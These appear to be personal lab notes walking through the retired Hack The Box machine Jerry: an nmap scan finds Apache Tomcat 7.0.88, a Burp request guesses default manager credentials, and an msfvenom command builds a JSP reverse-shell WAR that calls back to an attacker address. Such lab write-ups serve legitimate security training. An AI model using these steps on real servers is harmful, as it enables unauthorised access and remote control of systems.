Type: #windows 
Level: #easy 
Link: <https://app.hackthebox.eu/machines/Jerry>
Tags : #TCM
Tools: [[NMAP]] [[BURP]]	

## Pentesting of retired HTB VM Jerry
### Following walkthrougt of TCM on udemy

Info on the VM : Windows with IP 10.10.10.95

First let's do a classic nmap scan  

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-13 09:30 EDT
Nmap scan report for 10.10.10.95
Host is up (0.041s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

```

Interresting parts :

Apache Tomcat/7.0.88

An access to tomcat management page seems possible we can try defaut cred on it 

Using burp suite we got the following request :

```
GET /manager/html HTTP/1.1
Host: 10.10.10.95:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.10.95:8080/
Upgrade-Insecure-Requests: 1
Authorization: Basic §bWFuYWdlcjp0b21jYXQ=§

```

Now I just need to get default cred for tomcat via google then put them in base64 and use intruder 
Once the access is obtained un can use a  payload with msfvenom for a reverse shell using an WAR file upload.

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`

Once the shell poped i'm directly root so I got all the flags.